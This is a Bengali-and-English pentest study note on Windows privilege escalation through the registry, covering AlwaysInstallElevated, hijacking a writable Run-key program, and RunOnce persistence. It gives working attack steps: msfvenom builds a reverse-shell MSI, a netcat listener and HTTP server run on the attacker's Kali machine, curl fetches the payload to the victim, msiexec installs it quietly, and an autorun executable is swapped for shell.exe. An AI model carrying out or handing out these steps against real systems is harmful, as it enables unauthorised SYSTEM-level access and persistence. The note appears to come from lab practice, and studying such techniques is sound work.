# **WIndows Privilege Escalation via Registry**

📝 Windows Registry

Windows Registry হলো Windows অপারেটিং সিস্টেমের একটি কেন্দ্রীয় ডাটাবেজ, যেখানে সিস্টেম, হার্ডওয়্যার, সফটওয়্যার এবং ইউজার সেটিংস সংরক্ষিত থাকে।

🔹 সহজভাবে বুঝলে:

👉 Registry = Windows-এর “Configuration Storage”
👉 এখানে OS ও অ্যাপ্লিকেশন কীভাবে কাজ করবে তার তথ্য থাকে

📂 Registry Structure (গঠন)

Registry মূলত কয়েকটি Root Key (Hive) নিয়ে গঠিত:

* HKEY_LOCAL_MACHINE (HKLM) → সিস্টেম ও হার্ডওয়্যার সেটিংস
* HKEY_CURRENT_USER (HKCU) → বর্তমান ইউজারের সেটিংস
* HKEY_CLASSES_ROOT (HKCR) → ফাইল টাইপ ও অ্যাসোসিয়েশন
* HKEY_USERS (HKU) → সব ইউজারের সেটিংস
* HKEY_CURRENT_CONFIG (HKCC) → বর্তমান হার্ডওয়্যার কনফিগারেশন

⚙️ Registry ব্যবহার
* সফটওয়্যার কনফিগারেশন সংরক্ষণ
* Windows startup program নিয়ন্ত্রণ
* ইউজার preference (theme, settings)
* ডিভাইস ও ড্রাইভার তথ্য

🛠️ Registry Editor

👉 Registry edit করার জন্য টুল:
```
regedit

```
⚠️ গুরুত্বপূর্ণ সতর্কতা
* ভুলভাবে Registry পরিবর্তন করলে system crash হতে পারে
* edit করার আগে backup নেওয়া উচিত

### ==> Now show How Privilege escalate by Registry 
---
## **AlwaysInstallElevated Registry**
---

📝 AlwaysInstallElevated Registry – সংক্ষিপ্ত নোট (বাংলা)

AlwaysInstallElevated হলো একটি Registry setting, যা enable থাকলে .msi package install করার সময় automatic admin (elevated) privilege পায়।
📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Policies\Microsoft\Windows\Installer
HKLM\Software\Policies\Microsoft\Windows\Installer

```
👉 এখানে AlwaysInstallElevated = 1 হলে feature enable থাকে

⚙️ কীভাবে কাজ করে:

👉 User MSI file run করে → Windows check করে এই setting →
👉 Enable থাকলে → installer admin privilege নিয়ে run হয়

⚠️ Security Risk:
Normal user malicious .msi চালিয়ে admin access নিতে পারে
এটি একটি common Privilege Escalation vulnerability

### Check this registry for HKLM (Hive Key Local Machine)
```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
#### Output should be like 
```
AlwaysInstallElevated     REG_DWORD  0x1  [true]
DisableMSI                REG_DWORD  0x0  [flase]
``` 

### Check this registry for HKCU (Hive Key Current User)
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
```
#### Output should be like 
```
AlwaysInstallElevated     REG_DWORD  0x1  [true]
``` 

#### HKLM & HKCU outout should be like that then this technique is worked,otherwise not worked..

### Create a malicious shell.msi & run netcat listener on my kali machine

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f msi > shell.msi

python3 -m http.server 80

nc -nlvp 4444
```

### Now download and run the file in the windows
```
cd Desktop

curl http://my_kali_ip/shell.msi    [download]

msiexec /quiet /i shell.msi        [run]
```

#### when the file is run , get the reverse shell connection to my kali machine & get the system user 


---
## **Run Registry**
---
📝 Run & Autorun Registry – সংক্ষিপ্ত নোট (বাংলা)
Run Registry Key হলো এমন জায়গা যেখানে program path রাখা হয়, যা login বা startup-এ automatically run হয়

📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```
* HKCU → শুধু current user
* HKLM → সব user

⚙️ কীভাবে কাজ করে:

👉 System start / login → Registry check → Program auto run

### Check this registry for HKLM (Hive Key Local Machine)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\Current Version\Run
```

#### Output
```
My Program REG_SZ "c:\Program Files\Autorun Program\Program.exe"
```
### Go to this folder and check the file permission 
```
cd "c:\Program Files\Autorun Program"
dir
echo > program.exe      [gives no error.Write permission of this file]
echo > test.exe         [Access is denied..Can't create any file to this folder]
```

#### Now I should not delete the program.exe and make a new file program.exe which is malicious

### Now append the shell.exe [created for the AlwaysInstallElevated Registry ] to this program.exe
```
curl http://my_kali_ip/shell.exe -o program.exe
```

#### ==> Now when a user(admin) is login,then program.exe file is run automatically & give the reverse connection shell to my kali machine [running nc listener]



---
## **RunOnce Registry**
---
📝 RunOnce Registry – সংক্ষিপ্ত নোট (বাংলা)

RunOnce Registry Key এমন একটি key যেখানে রাখা program/script শুধু একবার run হয়, সাধারণত next login বা system startup-এ।
📂 গুরুত্বপূর্ণ key:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```
* HKCU → current user-এর জন্য
* HKLM → সব user-এর জন্য

⚙️ কীভাবে কাজ করে:
👉 System start / login → RunOnce key check → program run → entry automatically delete হয়ে যায়

⚠️ Security:
Malware একবার execution বা setup task চালাতে ব্যবহার করতে পারে

### Check this registry for HKLM (Hive Key Local Machine)

```
reg query HKLM\SOFTWARE\Microsoft\Windows\Current Version\Runonce
```
#### output: nothing is shown [no files]

### Now try to add a new registry
```
reg add HKLM\SOFTWARE\Microsoft\Windows\Current Version\Runonce /V shell /t REG_SZ /d "c:\Program Files\Autorun Program\Program.exe" /f
```

#### Output: Error[access is denied]
#### Here REG_SZ means string type registry

#### If there have access then when a user(admin) login it automatically run the "c:\Program Files\Autorun Program\Program.exe" and then get the reverse shell to my kali machine & then it will remove this "c:\Program Files\Autorun Program\Program.exe" file..